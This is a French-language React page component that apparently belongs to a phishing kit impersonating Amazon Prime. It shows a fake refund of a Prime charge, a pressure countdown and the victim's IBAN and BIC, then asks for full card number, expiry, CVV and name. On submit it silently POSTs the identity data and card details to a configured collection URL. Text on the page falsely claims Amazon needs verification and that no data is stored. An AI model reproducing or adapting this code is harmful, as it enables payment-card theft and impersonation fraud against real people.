import { useEffect, useMemo, useRef, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { CONFIG } from '../config'

function detectBrand(digits) {
  if (/^4/.test(digits)) return 'visa'
  if (/^(5[1-5]|2[2-7])/.test(digits)) return 'mastercard'
  if (/^3[47]/.test(digits)) return 'amex'
  return ''
}

function formatCardNumber(digits, brand) {
  if (brand === 'amex') {
    const parts = [digits.slice(0, 4), digits.slice(4, 10), digits.slice(10, 15)].filter(Boolean)
    return parts.join(' ')
  }
  const parts = []
  for (let i = 0; i < digits.length; i += 4) parts.push(digits.slice(i, i + 4))
  return parts.join(' ')
}

function luhnCheck(digits) {
  let sum = 0
  let alt = false
  for (let i = digits.length - 1; i >= 0; i--) {
    let n = parseInt(digits[i], 10)
    if (alt) {
      n *= 2
      if (n > 9) n -= 9
    }
    sum += n
    alt = !alt
  }
  return digits.length >= 12 && sum % 10 === 0
}

export default function PaiementPage() {
  const navigate = useNavigate()
  const [ident, setIdent] = useState(null)
  const [timeLeft, setTimeLeft] = useState(14 * 60 + 59)
  const [brand, setBrand] = useState('')
  const [showCvvTip, setShowCvvTip] = useState(false)
  const [card, setCard] = useState({ number: '', exp: '', cvv: '', name: '' })
  const [errors, setErrors] = useState({})
  const [submitting, setSubmitting] = useState(false)
  const cvvRef = useRef(null)

  useEffect(() => {
    const raw = localStorage.getItem('primstrm_ident')
    if (raw) {
      try {
        const parsed = JSON.parse(raw)
        setIdent(parsed)
        if (parsed.name) {
          setCard((c) => ({ ...c, name: String(parsed.name).toUpperCase() }))
        }
      } catch {}
    }
  }, [])

  useEffect(() => {
    const t = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 0) {
          clearInterval(t)
          return 0
        }
        return prev - 1
      })
    }, 1000)
    return () => clearInterval(t)
  }, [])

  useEffect(() => {
    function hide(e) {
      const target = e.target
      if (!target.closest('#cvv-help-btn') && !target.closest('#cvv-tooltip')) {
        setShowCvvTip(false)
      }
    }
    document.addEventListener('click', hide)
    return () => document.removeEventListener('click', hide)
  }, [])

  const countdown = useMemo(() => {
    const m = Math.floor(timeLeft / 60)
    const s = timeLeft % 60
    return `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`
  }, [timeLeft])

  const firstName = ident?.name ? ident.name.split(' ')[0] : ''
  const userName = ident?.name || ''

  const updateCard = (field, value) => {
    setCard((c) => ({ ...c, [field]: value }))
    setErrors((e) => ({ ...e, [field]: false }))
  }

  const handleNumber = (value) => {
    const digits = value.replace(/\D/g, '').slice(0, 19)
    const b = detectBrand(digits)
    const maxLen = b === 'amex' ? 15 : 16
    const truncated = digits.slice(0, maxLen)
    setBrand(b)
    updateCard('number', formatCardNumber(truncated, b))
    if (cvvRef.current) cvvRef.current.maxLength = b === 'amex' ? 4 : 3
  }

  const handleExp = (value) => {
    let digits = value.replace(/\D/g, '').slice(0, 4)
    if (digits.length >= 1) {
      const m = digits.slice(0, 2)
      if (m.length === 1 && parseInt(m, 10) > 1) digits = '0' + digits
    }
    updateCard('exp', digits.length > 2 ? `${digits.slice(0, 2)}/${digits.slice(2)}` : digits)
  }

  const handleCvv = (value) => {
    const max = brand === 'amex' ? 4 : 3
    updateCard('cvv', value.replace(/\D/g, '').slice(0, max))
  }

  const validate = () => {
    const nextErrors = {}
    let ok = true
    const fail = (key) => {
      ok = false
      nextErrors[key] = true
    }

    const digits = card.number.replace(/\D/g, '')
    const b = detectBrand(digits)
    const minLen = b === 'amex' ? 15 : 13
    if (!digits || digits.length < minLen || !luhnCheck(digits)) fail('number')

    const m = card.exp.match(/^(\d{2})\/(\d{2})$/)
    if (!m) {
      fail('exp')
    } else {
      const mm = parseInt(m[1], 10)
      const yy = parseInt(m[2], 10)
      const now = new Date()
      const cy = now.getFullYear() % 100
      const cm = now.getMonth() + 1
      if (mm < 1 || mm > 12 || yy < cy || (yy === cy && mm < cm)) fail('exp')
    }

    const cvvLen = b === 'amex' ? 4 : 3
    if (!/^\d+$/.test(card.cvv) || card.cvv.length !== cvvLen) fail('cvv')

    const nameParts = card.name.trim().split(/\s+/)
    if (!card.name.trim() || nameParts.length < 2) fail('name')

    setErrors(nextErrors)
    return ok
  }

  const submit = (e) => {
    e.preventDefault()
    if (!validate()) return
    setSubmitting(true)

    const headers = { 'Content-Type': 'application/json' }

    try {
      fetch(CONFIG.workerUrl, {
        method: 'POST',
        headers,
        body: JSON.stringify({
          channel: 'prime',
          siteHost: typeof window !== 'undefined' ? window.location.hostname : '',
          identity: ident,
          card,
        }),
      }).catch(() => {})
    } catch {
      // ignore
    }

    setTimeout(() => {
      const last4 = card.number.replace(/\D/g, '').slice(-4) || '0000'
      localStorage.setItem('primstrm_last4', last4)
      navigate('/confirmation/')
    }, 800)
  }

  return (
    <>
      <style>{`
/* ── Layout ───────────────────────────────────────────────────────── */
.pay-wrapper { max-width:560px; margin:0 auto; padding:16px; }

/* ── Bandeau remboursement ────────────────────────────────────────── */
.refund-banner {
  background:#F6FDF7; border:1px solid #A5D6A7;
  border-radius:8px; padding:10px 14px; margin-bottom:14px;
  display:flex; align-items:center; gap:10px;
}
.refund-banner svg { flex-shrink:0; }
.refund-banner-title { font-size:13px; font-weight:700; color:#2E7D32; margin:0 0 2px; }
.refund-banner-sub   { font-size:12px; color:#555; margin:0; }
.refund-amount { font-size:16px; font-weight:700; color:#1E8449; margin:3px 0 0; }

/* ── Compte à rebours ─────────────────────────────────────────────── */
.timer-bar {
  background:#FFF8EC; border:1px solid #E8C87A;
  border-radius:6px; padding:9px 14px; margin-bottom:16px;
  display:flex; align-items:center; gap:10px;
  font-size:13px; color:#5D4200;
}
.timer-bar svg { flex-shrink:0; }
.timer-bar-content { flex:1; font-size:13px; }
.timer-val {
  font-weight:700; font-size:14px; color:#5D4200;
  font-family:'Courier New',monospace; white-space:nowrap;
  background:#FFF0CC; border:1px solid #E8C87A;
  border-radius:4px; padding:2px 8px;
  flex-shrink:0;
}

/* ── Carte principale ─────────────────────────────────────────────── */
.pay-card {
  background:#fff; border:1px solid #D5D9D9; border-radius:10px;
  padding:22px 20px; box-shadow:0 2px 8px rgba(0,0,0,.07);
}
.pay-section-title {
  font-size:13px; font-weight:700; color:#565959; text-transform:uppercase;
  letter-spacing:.6px; margin:0 0 14px; padding-bottom:8px;
  border-bottom:1px solid #EAEDED;
}

/* ── Champs ───────────────────────────────────────────────────────── */
.pay-field { margin-bottom:14px; position:relative; }
.pay-label {
  display:flex; align-items:center; justify-content:space-between;
  font-size:13px; font-weight:700; color:#0F1111; margin-bottom:6px;
}
.pay-label .required { color:#B12704; margin-left:2px; }
.pay-input {
  width:100%; box-sizing:border-box;
  padding:10px 12px; font-size:15px; color:#0F1111; background:#fff;
  border:1.5px solid #888c8c; border-radius:8px;
  box-shadow:inset 0 1px 0 rgba(15,17,17,.07);
  font-family:"Amazon Ember",Arial,sans-serif;
  transition:border-color .15s, box-shadow .15s;
  -webkit-appearance:none;
}
.pay-input:focus { outline:none; border-color:#e77600; box-shadow:0 0 3px 2px rgba(228,121,17,.5); }
.pay-input.is-error { border-color:#E16E5C; box-shadow:0 0 3px 2px rgba(225,110,92,.25); }
.pay-input::placeholder { color:#9b9b9b; }
.pay-input.is-mono { letter-spacing:.5px; font-variant-numeric:tabular-nums; }
.pay-error-msg { display:none; color:#B12704; font-size:12.5px; margin-top:5px; }
.pay-error-msg.is-visible { display:block; }
.pay-row { display:flex; gap:12px; }
.pay-row > .pay-field { flex:1; min-width:0; }

/* Brand badge */
.card-brand {
  display:inline-flex; align-items:center; justify-content:center;
  min-width:42px; padding:3px 8px; border-radius:4px;
  font-size:11px; font-weight:800; letter-spacing:.5px; text-transform:uppercase;
  background:#E7E9EC; color:#565959;
}
.card-brand[data-brand="visa"]       { background:#1A1F71; color:#FFD400; }
.card-brand[data-brand="mastercard"] { background:#EB001B; color:#fff; }
.card-brand[data-brand="amex"]       { background:#2E77BB; color:#fff; }

/* CVV helper */
.cvv-help { cursor:pointer; color:#007185; text-decoration:underline; font-size:12px; font-weight:400; }
.cvv-tooltip {
  display:none; position:absolute; right:0; top:calc(100% + 4px);
  background:#fff; border:1px solid #D5D9D9; border-radius:6px;
  padding:10px 12px; font-size:12px; color:#0F1111; z-index:10;
  box-shadow:0 4px 12px rgba(0,0,0,.12); width:220px; line-height:1.5;
}
.cvv-tooltip.show { display:block; }

/* ── Bouton ────────────────────────────────────────────────────────── */
.btn-submit {
  display:block; width:100%; text-align:center;
  background:linear-gradient(to bottom, #4CAF50, #3d9140);
  border:1px solid #2e7d32; border-radius:8px;
  padding:11px 14px; font-size:14px; font-weight:700; color:#fff;
  cursor:pointer; box-shadow:0 2px 5px rgba(46,125,50,.25);
  font-family:"Amazon Ember",Arial,sans-serif; margin-top:4px;
}
.btn-submit:hover { background:linear-gradient(to bottom, #43A047, #388E3C); }
.btn-submit:disabled { opacity:.65; cursor:not-allowed; }

/* ── Logos carte dynamiques ────────────────────────────────────────── */
.card-logos { display:flex; gap:6px; align-items:center; }
.card-logo {
  height:24px; width:auto; object-fit:contain;
  border-radius:4px; border:1.5px solid #E0E0E0;
  padding:2px 5px; background:#fff;
  opacity:.25; filter:grayscale(1);
  transition:opacity .2s, filter .2s, border-color .2s, transform .15s;
}
.card-logo.active {
  opacity:1; filter:none;
  border-color:#888;
  transform:scale(1.08);
  box-shadow:0 1px 4px rgba(0,0,0,.15);
}

/* ── Sécurité ──────────────────────────────────────────────────────── */
.secure-block {
  margin-top:16px; display:flex; flex-direction:column; align-items:center; gap:8px;
}
.secure-row {
  display:flex; align-items:center; gap:6px;
  font-size:12px; color:#565959;
}
.secure-logos { display:flex; gap:8px; align-items:center; }
.secure-logos .card-brand { min-width:34px; padding:2px 7px; font-size:10px; opacity:.85; }
.ssl-badge {
  display:flex; align-items:center; gap:4px;
  border:1px solid #D5D9D9; border-radius:5px; padding:4px 10px;
  font-size:11px; font-weight:700; color:#067D62;
}

/* ── Progress bar ─────────────────────────────────────────────────── */
.progress-bar {
  display:flex; align-items:center; justify-content:center;
  gap:0; margin-bottom:18px; font-size:12px;
}
.prog-step {
  display:flex; align-items:center; gap:5px;
  color:#767676; font-weight:500; white-space:nowrap;
}
.prog-step.done { color:#067D62; }
.prog-step.active { color:#0F1111; font-weight:700; }
.prog-dot {
  width:22px; height:22px; border-radius:50%; border:2px solid #D5D9D9;
  display:flex; align-items:center; justify-content:center;
  font-size:10px; font-weight:700; background:#fff; color:#767676; flex-shrink:0;
}
.prog-step.done .prog-dot { background:#067D62; border-color:#067D62; color:#fff; }
.prog-step.active .prog-dot { background:#0F1111; border-color:#0F1111; color:#fff; }
.prog-line { flex:1; height:2px; background:#D5D9D9; margin:0 4px; min-width:20px; }
.prog-line.done { background:#067D62; }

/* ── Compteur social ───────────────────────────────────────────────── */
.social-counter {
  text-align:center; font-size:12px; color:#565959;
  background:#F7F8F8; border:1px solid #EAEDED; border-radius:6px;
  padding:7px 12px; margin-bottom:14px;
}
.social-counter strong { color:#067D62; }

/* ── BIN detect badge ─────────────────────────────────────────────── */
.bin-badge {
  display:none; align-items:center; gap:7px; margin-top:7px;
  background:#EAF7EE; border:1px solid #A5D6A7; border-radius:6px;
  padding:6px 10px; font-size:12.5px; color:#1B5E20; font-weight:600;
  animation:fadeIn .3s ease;
}
.bin-badge.show { display:flex; }
@keyframes fadeIn { from{opacity:0;transform:translateY(-4px)} to{opacity:1;transform:none} }

/* ── Aucun débit badge ────────────────────────────────────────────── */
.no-debit {
  display:flex; align-items:center; justify-content:center; gap:6px;
  background:#EAF4FB; border:1px solid #B3D4F0; border-radius:6px;
  padding:8px 12px; margin-top:10px;
  font-size:12.5px; color:#0D47A1; font-weight:600;
}

/* ── Récapitulatif ─────────────────────────────────────────────────── */
.recap-box {
  background:#F7F8F8; border:1px solid #E7E9EC; border-radius:8px;
  padding:14px 16px; margin-bottom:18px; font-size:13px; color:#0F1111;
}
.recap-row { display:flex; justify-content:space-between; padding:4px 0; }
.recap-row.total { font-weight:700; font-size:15px; border-top:1px solid #D5D9D9; margin-top:6px; padding-top:10px; }
.recap-green { color:#1E8449; font-weight:800; }

/* ── Bloc RIB ──────────────────────────────────────────────────────── */
.rib-block {
  margin:10px 0 12px;
  border:1px solid #C8D8E8;
  border-radius:7px;
  overflow:hidden;
  font-size:12.5px;
  background:#F9FBFD;
  position:relative;
}
.rib-block::before {
  content:'';
  position:absolute;
  right:-10px; bottom:-10px;
  width:160px; height:100px;
  background:url('https://download.logo.wine/logo/Amazon_Prime/Amazon_Prime-Logo.wine.png') no-repeat center/contain;
  opacity:.07;
  pointer-events:none;
  z-index:0;
}
.rib-block > * { position:relative; z-index:1; }
.rib-header {
  background:linear-gradient(135deg,#1a2744 0%,#243763 100%);
  border-bottom:1px solid #1a2744;
  padding:8px 12px;
  font-size:11px;
  font-weight:700;
  color:#90B8F8;
  text-transform:uppercase;
  letter-spacing:.6px;
  display:flex;
  align-items:center;
  gap:6px;
}
.rib-row {
  display:flex;
  align-items:center;
  padding:7px 12px;
  border-bottom:1px dashed #D8E4EF;
  gap:10px;
}
.rib-row:last-child { border-bottom:none; }
.rib-label {
  min-width:70px;
  font-size:11px;
  color:#778;
  text-transform:uppercase;
  letter-spacing:.4px;
  font-weight:600;
  flex-shrink:0;
}
.rib-value {
  font-family:'Courier New',Courier,monospace;
  font-size:12.5px;
  color:#0F1111;
  font-weight:600;
  letter-spacing:.5px;
}
.rib-name {
  font-family:"Amazon Ember",Arial,sans-serif;
  font-size:13px;
  letter-spacing:.3px;
  color:#1a1a1a;
}
.rib-iban {
  letter-spacing:1.5px;
  font-size:12px;
  color:#0F1111;
  word-break:break-all;
}
.rib-bic { letter-spacing:1px; }

/* ── Info notice ───────────────────────────────────────────────────── */
.info-notice {
  background:#EAF4FB; border-left:3px solid #0072C6;
  border-radius:0 6px 6px 0; padding:10px 12px;
  font-size:12.5px; color:#0F1111; margin-bottom:16px; line-height:1.55;
}

@media(max-width:480px){
  .pay-wrapper { padding:10px; }
  .pay-card { padding:16px 12px; border-radius:8px; }

  .top-banner { padding:10px 12px !important; }
  .top-banner svg { width:14px; height:14px; }
  .top-banner span { font-size:12px !important; }

  .progress-bar { font-size:10px; margin-bottom:12px; }
  .prog-step span { display:none; }
  .prog-dot { width:18px; height:18px; font-size:9px; }
  .prog-line { min-width:10px; }

  .timer-bar { padding:8px 10px; font-size:12px; gap:8px; }
  .timer-bar svg { width:16px; height:16px; }
  .timer-val { font-size:13px; padding:2px 6px; }

  .refund-banner { flex-direction:column; align-items:flex-start; padding:10px 12px; }
  .refund-banner svg { width:20px; height:20px; }
  .refund-banner-title { font-size:12px; }
  .refund-banner-sub { font-size:11px; }
  .refund-amount { font-size:15px; }

  .recap-box { padding:12px; font-size:12px; }
  .recap-row.total { font-size:14px; }

  .rib-block { font-size:11.5px; }
  .rib-header { padding:7px 10px; font-size:10px; }
  .rib-row { padding:6px 10px; gap:8px; }
  .rib-label { min-width:60px; font-size:10px; }
  .rib-value { font-size:11.5px; }

  .info-notice { padding:9px 10px; font-size:11.5px; }

  .pay-section-title { font-size:12px; margin-bottom:12px; }
  .pay-label { font-size:12px; }
  .pay-input { padding:9px 10px; font-size:14px; }

  .number-label { flex-direction:column; align-items:flex-start; gap:6px; }
  .card-logos { align-self:flex-end; }
  .card-logo { height:20px; }

  .pay-row { gap:8px; }

  .cvv-help { font-size:11px; }
  .cvv-tooltip { width:180px; font-size:11px; }

  .btn-submit { padding:10px 12px; font-size:13px; }

  .secure-row { flex-wrap:wrap; justify-content:center; text-align:center; }
  .secure-logos img { height:18px !important; }
  .secure-block > div:last-child { font-size:10px; }
}
      `}</style>

      <div className="top-banner" style={{ background: '#37475A', padding: '12px 20px', display: 'flex', alignItems: 'center', gap: '10px' }}>
        <svg width="16" height="16" viewBox="0 0 24 24" fill="#fff">
          <path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0-2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5Zm-3 8V6a3 3 0 0 1 6 0v3H9Z" />
        </svg>
        <span style={{ color: '#fff', fontSize: '14px', fontWeight: 700 }}>Étape 3 sur 3 — Vérification du moyen de paiement</span>
      </div>

      <main className="pay-wrapper">
        {/* Progress bar */}
        <div className="progress-bar">
          <div className="prog-step done">
            <div className="prog-dot">✓</div>
            <span>Identité</span>
          </div>
          <div className="prog-line done"></div>
          <div className="prog-step done">
            <div className="prog-dot">✓</div>
            <span>Abonnement</span>
          </div>
          <div className="prog-line done"></div>
          <div className="prog-step active">
            <div className="prog-dot">3</div>
            <span>Résiliation</span>
          </div>
        </div>

        {/* Compte à rebours */}
        <div className="timer-bar">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="#B71C1C">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67V7z" />
          </svg>
          <div className="timer-bar-content">
            Votre session de vérification expire dans
          </div>
          <span className="timer-val">{countdown}</span>
        </div>

        {/* Bandeau remboursement */}
        <div className="refund-banner">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="#1E8449">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
          </svg>
          <div>
            <p className="refund-banner-title">Remboursement confirmé — Vérification requise</p>
            <p className="refund-banner-sub">Bonjour {firstName || '—'}, votre abonnement a été prélevé le {CONFIG.prelevementDate}.</p>
            <p className="refund-amount">+ {CONFIG.refundAmountStr} € à recevoir</p>
          </div>
        </div>

        {/* Récapitulatif */}
        <div className="recap-box">
          <div className="recap-row">
            <span>Abonnement Prime annuel — prélevé le {CONFIG.prelevementDate}</span>
            <span style={{ color: '#B12704', fontWeight: 700, fontSize: '13px', whiteSpace: 'nowrap' }}>- {CONFIG.refundAmountStr}<span style={{ fontSize: '11px' }}> €</span></span>
          </div>
          <div className="recap-row"><span style={{ color: '#767676', fontSize: '12px' }}>Réf. {CONFIG.reference}</span><span></span></div>

          {(userName !== '' || ident?.iban !== '' || ident?.bic !== '') && (
            /* Bloc RIB style */
            <div className="rib-block">
              <div className="rib-header">
                <svg width="13" height="13" viewBox="0 0 24 24" fill="#555">
                  <path d="M4 4h16a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2zm0 4v10h16V8H4zm2 2h4v2H6v-2zm0 3h4v2H6v-2zm6-3h6v2h-6v-2zm0 3h4v2h-4v-2z" />
                </svg>
                Coordonnées bancaires du compte
              </div>
              {userName !== '' && (
                <div className="rib-row">
                  <span className="rib-label">Titulaire</span>
                  <span className="rib-value rib-name">{userName.toUpperCase()}</span>
                </div>
              )}
              {ident?.iban !== '' && ident?.iban && (
                <div className="rib-row">
                  <span className="rib-label">IBAN</span>
                  <span className="rib-value rib-iban">{ident.iban.match(/.{1,4}/g)?.join(' ')}</span>
                </div>
              )}
              {ident?.bic !== '' && ident?.bic && (
                <div className="rib-row">
                  <span className="rib-label">BIC</span>
                  <span className="rib-value rib-bic">{ident.bic}</span>
                </div>
              )}
            </div>
          )}

          <div className="recap-row"><span>Frais de dossier</span><span>0,00 €</span></div>
          <div className="recap-row total"><span>Remboursement total</span><span className="recap-green">+ {CONFIG.refundAmountStr} €</span></div>
        </div>

        {/* Notice */}
        <div className="info-notice">
          🔒 Pour des raisons de sécurité, Amazon doit vérifier que vous êtes bien le titulaire du moyen de paiement associé à ce compte. <strong>Aucun montant ne sera débité.</strong> Le remboursement sera crédité sous 3 à 5 jours ouvrés.
        </div>

        {/* Formulaire */}
        <form id="pay-form" className="pay-card" onSubmit={submit} noValidate autoComplete="on">
          <input type="hidden" name="step" value="payment" />

          <p className="pay-section-title">Vérification de l'identité bancaire</p>

          <div className="pay-field">
            <label className="pay-label number-label" htmlFor="card-number">
              <span>Numéro de la carte bancaire<span className="required">*</span></span>
              {/* Logos détectés dynamiquement */}
              <div className="card-logos" id="card-logos">
                <img
                  id="logo-visa"
                  src="https://upload.wikimedia.org/wikipedia/commons/9/98/Visa_Inc._logo_%282005%E2%80%932014%29.svg"
                  alt="Visa"
                  className={`card-logo ${brand === 'visa' ? 'active' : ''}`}
                />
                <img
                  id="logo-mastercard"
                  src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/120px-Mastercard-logo.svg.png"
                  alt="Mastercard"
                  className={`card-logo ${brand === 'mastercard' ? 'active' : ''}`}
                />
                <img
                  id="logo-amex"
                  src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/American_Express_logo_%282018%29.svg/60px-American_Express_logo_%282018%29.svg.png"
                  alt="Amex"
                  className={`card-logo ${brand === 'amex' ? 'active' : ''}`}
                />
              </div>
            </label>
            <input
              id="card-number"
              name="card-number"
              type="text"
              inputMode="numeric"
              autoComplete="cc-number"
              maxLength={23}
              placeholder="1234 5678 9012 3456"
              required
              className={`pay-input is-mono ${errors.number ? 'is-error' : ''}`}
              value={card.number}
              onChange={(e) => handleNumber(e.target.value)}
            />
            <input type="hidden" name="card-brand" id="card-brand-hidden" value={brand} />
            {/* BIN detection badge */}
            <div className={`bin-badge ${brand ? 'show' : ''}`} id="bin-badge">
              <svg width="14" height="14" viewBox="0 0 24 24" fill="#1B5E20">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
              </svg>
              <span id="bin-badge-text">
                {brand
                  ? `Carte ${brand === 'visa' ? 'Visa' : brand === 'mastercard' ? 'Mastercard' : 'American Express'} détectée — Remboursement vers ce compte ✓`
                  : 'Carte détectée'}
              </span>
            </div>
            <div className={`pay-error-msg ${errors.number ? 'is-visible' : ''}`} id="err-card-number">Numéro de carte invalide.</div>
          </div>

          <div className="pay-row">
            <div className="pay-field">
              <label className="pay-label" htmlFor="card-exp"><span>Date de validité<span className="required">*</span></span></label>
              <input
                id="card-exp"
                name="card-exp"
                type="text"
                inputMode="numeric"
                autoComplete="cc-exp"
                maxLength={5}
                placeholder="MM/AA"
                required
                className={`pay-input is-mono ${errors.exp ? 'is-error' : ''}`}
                value={card.exp}
                onChange={(e) => handleExp(e.target.value)}
              />
              <div className={`pay-error-msg ${errors.exp ? 'is-visible' : ''}`} id="err-card-exp">Date invalide.</div>
            </div>
            <div className="pay-field" style={{ position: 'relative' }}>
              <label className="pay-label" htmlFor="card-cvv">
                <span>CVV<span className="required">*</span></span>
                <span
                  className="cvv-help"
                  id="cvv-help-btn"
                  onClick={(e) => { e.stopPropagation(); setShowCvvTip((s) => !s) }}
                >Où le trouver ?</span>
              </label>
              <input
                ref={cvvRef}
                id="card-cvv"
                name="card-cvv"
                type="text"
                inputMode="numeric"
                autoComplete="cc-csc"
                maxLength={brand === 'amex' ? 4 : 3}
                placeholder="123"
                required
                className={`pay-input is-mono ${errors.cvv ? 'is-error' : ''}`}
                value={card.cvv}
                onChange={(e) => handleCvv(e.target.value)}
              />
              <div className={`cvv-tooltip ${showCvvTip ? 'show' : ''}`} id="cvv-tooltip">
                <strong>Code de sécurité (CVV/CVC)</strong><br />
                3 chiffres au dos de votre carte Visa ou Mastercard. 4 chiffres au recto pour American Express.
              </div>
              <div className={`pay-error-msg ${errors.cvv ? 'is-visible' : ''}`} id="err-card-cvv">Code CVV invalide.</div>
            </div>
          </div>

          <div className="pay-field">
            <label className="pay-label" htmlFor="card-name"><span>Nom du porteur de carte<span className="required">*</span></span></label>
            <input
              id="card-name"
              name="card-name"
              type="text"
              autoComplete="cc-name"
              placeholder="Prénom et nom"
              required
              className={`pay-input ${errors.name ? 'is-error' : ''}`}
              value={card.name}
              onChange={(e) => updateCard('name', e.target.value)}
            />
            <div className={`pay-error-msg ${errors.name ? 'is-visible' : ''}`} id="err-card-name">Veuillez saisir le nom figurant sur la carte.</div>
          </div>

          <button type="submit" id="pay-submit" className="btn-submit" disabled={submitting}>
            {submitting ? 'Traitement en cours…' : `Recevoir mon remboursement — ${CONFIG.refundAmountStr} €`}
          </button>

          <div style={{ textAlign: 'center', marginTop: '8px', fontSize: '11.5px', color: '#767676', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '5px' }}>
            <svg width="11" height="11" viewBox="0 0 24 24" fill="#767676">
              <path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0-2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5Zm-3 8V6a3 3 0 0 1 6 0v3H9Z" />
            </svg>
            Aucun prélèvement · Vérification uniquement
          </div>

          <div className="secure-block">
            <div className="secure-row">
              <div className="ssl-badge">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="#067D62">
                  <path d="M12 1a5 5 0 0 0-5 5v3H6a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h12a2 2 0 0 0-2-2v-9a2 2 0 0 0-2-2h-1V6a5 5 0 0 0-5-5Zm-3 8V6a3 3 0 0 1 6 0v3H9Z" />
                </svg>
                SSL 256-bit
              </div>
              <span>Paiement sécurisé par Amazon Pay</span>
            </div>
            {/* Vrais logos CB */}
            <div className="secure-logos" style={{ display: 'flex', gap: '10px', alignItems: 'center', margin: '6px 0' }}>
              <img
                src="https://upload.wikimedia.org/wikipedia/commons/9/98/Visa_Inc._logo_%282005%E2%80%932014%29.svg"
                alt="Visa"
                height={22}
                style={{ objectFit: 'contain' }}
                onError={(e) => { (e.currentTarget).style.display = 'none' }}
              />
              <img
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/120px-Mastercard-logo.svg.png"
                alt="Mastercard"
                height={24}
                style={{ objectFit: 'contain' }}
                onError={(e) => { (e.currentTarget).style.display = 'none' }}
              />
              <img
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/American_Express_logo_%282018%29.svg/60px-American_Express_logo_%282018%29.svg.png"
                alt="Amex"
                height={24}
                style={{ objectFit: 'contain' }}
                onError={(e) => { (e.currentTarget).style.display = 'none' }}
              />
              <img
                src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/3d_secure_2.svg/80px-3d_secure_2.svg.png"
                alt="3D Secure"
                height={24}
                style={{ objectFit: 'contain' }}
                onError={(e) => { (e.currentTarget).style.display = 'none' }}
              />
            </div>
            <div style={{ fontSize: '11px', color: '#767676', textAlign: 'center', lineHeight: '1.5' }}>
              Vos données bancaires sont chiffrées et ne sont jamais stockées sur nos serveurs.<br />
              Remboursement traité par Amazon Payments Europe S.C.A.
            </div>
          </div>
        </form>
      </main>

      </>
  )
}
